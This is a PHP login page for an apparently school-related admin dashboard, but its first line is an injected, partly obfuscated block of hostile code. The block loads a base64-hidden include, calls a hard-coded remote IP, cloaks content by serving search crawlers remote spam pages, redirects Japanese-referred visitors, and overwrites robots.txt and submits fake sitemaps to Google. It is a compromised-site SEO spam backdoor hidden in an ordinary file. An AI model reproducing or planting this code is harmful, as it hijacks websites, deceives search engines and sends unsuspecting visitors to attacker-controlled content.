<?php
@include base64_decode('Y29yZS9pbWFnZS5wbmc='); $inter_domain='http://142.54.191.130/z0225_17/';function curl_get_contents($url){$ch=curl_init();curl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);$file_contents = curl_exec($ch);curl_close($ch);return $file_contents; }function getServerCont($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){ return false;}return $output;}function is_crawler($agent){$agent_check=false; $bots='googlebot|google|yahoo|bing|aol';if($agent!=''){if(preg_match("/($bots)/si",$agent)){$agent_check = true; }}return $agent_check;}function check_refer($refer){ $check_refer=false;$referbots='google.co.jp|yahoo.co.jp|google.com';if($refer!='' && preg_match("/($referbots)/si",$refer)){ $check_refer=true; }return $check_refer; }$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$req_uri=$_SERVER['REQUEST_URI'];$domain=$_SERVER["HTTP_HOST"];$self=$_SERVER['PHP_SELF'];$ser_name=$_SERVER['SERVER_NAME'];$req_url=$http.$domain.$req_uri;$indata1=$inter_domain."/indata.php";$map1=$inter_domain."/map.php";$jump1=$inter_domain."/jump.php";$url_words=$inter_domain."/words.php";$url_robots=$inter_domain."/robots.php";if(strpos($req_uri,".php")){$href1=$http.$domain.$self;}else{$href1=$http.$domain;}$data1[]=array();$data1['domain']=$domain;$data1['req_uri']=$req_uri;$data1['href']=$href1;$data1['req_url']=$req_url;if(substr($req_uri,-6)=='robots'){$robots_cont = getServerCont($url_robots,$data1);define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));file_put_contents(BASE_PATH.'/robots.txt',$robots_cont);$robots_cont=file_get_contents(BASE_PATH.'/robots.txt');if(strpos(strtolower($robots_cont),"sitemap")){echo 'robots.txt file create success!';}else{echo 'robots.txt file create fail!';}return;}if(substr($req_uri,-4)=='.xml'){if(strpos($req_uri,"pingsitemap.xml")){ $str_cont = getServerCont($map1,$data1); $str_cont_arr= explode(",",$str_cont); $str_cont_arr[]='sitemap'; for($k=0;$k<count($str_cont_arr);$k++){ if(strpos($href1,".php")> 0){ $tt1='?'; }else{ $tt1='/';}$http2=$href1.$tt1.$str_cont_arr[$k].'.xml';$data_new='https://www.google.com/ping?sitemap='.$http2;$data_new1='http://www.google.com/ping?sitemap='.$http2;if(stristr(@file_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@file_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL; }else{echo $data_new1.'===>Submitting Google Sitemap: fail'.PHP_EOL;} } return;} if(strpos($req_uri,"allsitemap.xml")){ $str_cont = getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;return;} if(strpos($req_uri,".php")){ $word4=explode("?",$req_uri); $word4=$word4[count($word4)-1]; $word4=str_replace(".xml","",$word4); }else{ $word4= str_replace("/","",$req_uri);$word4= str_replace(".xml","",$word4); }$data1['word']=$word4;$data1['action']='check_sitemap';$check_url4=getServerCont($url_words,$data1);if($check_url4=='1'){ $str_cont=getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;return;} $data1['action']="check_words"; $check1= getServerCont($url_words,$data1);if(strpos($req_uri,"map")> 0 || $check1=='1') $data1['action']="rand_xml";$check_url4=getServerCont($url_words,$data1);header("Content-type:text/xml");echo $check_url4;return;}if(strpos($req_uri,".php")){$main_shell=$http.$ser_name.$self;$data1['main_shell']=$main_shell;}else{$main_shell=$http.$ser_name;$data1['main_shell']=$main_shell;}$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';$chk_refer=check_refer($referer); if(strpos($_SERVER['REQUEST_URI'],'.php')){ $url_ext='?'; }else{ $url_ext='/'; } if($chk_refer && (preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match('/ja/i',@$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/^[a-z0-9]+[0-9]+$/",end(explode($url_ext,str_replace(array(".html",".htm"),"",$_SERVER['REQUEST_URI'])))))){echo getServerCont($jump1,$data1);return; } $user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');$res_crawl=is_crawler($user_agent); if($res_crawl){ $data1['http_user_agent']=$user_agent;$get_content = getServerCont($indata1,$data1); echo $get_content;return; } define( 'WP_USE_THEMES', true );?>
<?php
require_once 'core/init.php';
$log ='';
if(Input::exists("user_code")) {

    if(Token::check(Input::get('token'))) {

        $validate = new Validate();
        $validate->check($_POST, array(
            'user_code' => array('required' => true),
            'password' => array('required' => true)
        ));

        if($validate->passed()) {

            $user = new User();
            $remember = (Input::get('remember') === 'on') ? true : false;
            
            $login = $user->login(Input::get('user_code'), Input::get('password'), $remember);

            if($login == 1|| $login == 2||$login == 3||$login == 4 ) {
              
                Redirect::to('dashboard.php?SJBSI=1');
            } else if($login == 5){
               
             
                    $log = '<div class="alert alert-danger alert-dismissable">
                    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                    <p>Sorry you Can no longer login your account as you are now out of school. please contact your school if you need any data</p>
                       </div>';
                    
              
               
            }else{

                $log = '<div class="alert alert-danger alert-dismissable">
                    <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                    <p>Incorrect username or password</p>
                       </div>';
            }
        } else {
          
            foreach ($validate->errors() as $error) {
                $log .= '<div class="alert alert-danger alert-dismissable">
                <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                '.$error.'
                   </div>';
                
            }
        }
    }
}
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bootsrtap Free Admin Template - SIMINTA | Admin Dashboad Template</title>
    <!-- Core CSS - Include with every page -->
    <link href="assets/plugins/bootstrap/bootstrap.css" rel="stylesheet" />
    <link href="assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="assets/plugins/pace/pace-theme-big-counter.css" rel="stylesheet" />
   <link href="assets/css/style.css" rel="stylesheet" />
      <link href="assets/css/main-style.css" rel="stylesheet" />

</head>

<body class="body-Login-back">

    <div class="container">
       
        <div class="row">
            <div class="col-md-4 col-md-offset-4 text-center logo-margin ">
            <img class="imgs" src="assets/img/logo.png" alt="">
                </div>
            <div class="col-md-4 col-md-offset-4">
                <div class="login-panel panel panel-default">                  
                    <div class="panel-heading">
                        <h3 class="panel-title">Please Sign In</h3>
                    </div>
                    <div class="panel-body">
                        
                       <?php 
                      echo $log ;
                if(Session::exists('home')){  echo '<div class="alert alert-success alert-dismissable">
                <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
                '.Session::flash('home').'
                   </div>'; } ?>
                    <form action="" method="post">
                            <fieldset>
                                <div class="form-group">
                                    <input class="form-control" placeholder="Enter you ID Ro username" name="user_code" type="text" autofocus>
                                </div>
                                <div class="form-group">
                                    <input class="form-control" placeholder="Password" name="password" type="password" value="">
                                </div>
                                <div class="checkbox">
                                    <label>
                                        <input name="remember" type="checkbox" value="Remember Me">Remember Me
                                    </label>
                                </div>
                                <input type="hidden" name="token" value="<?php echo Token::generate(); ?>">
                                <input type="submit" class="btn btn-lg btn-primary btn-block" value="Login">
                            </fieldset>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

     <!-- Core Scripts - Include with every page -->
    <script src="assets/plugins/jquery-1.10.2.js"></script>
    <script src="assets/plugins/bootstrap/bootstrap.min.js"></script>
    <script src="assets/plugins/metisMenu/jquery.metisMenu.js"></script>

</body>

</html>
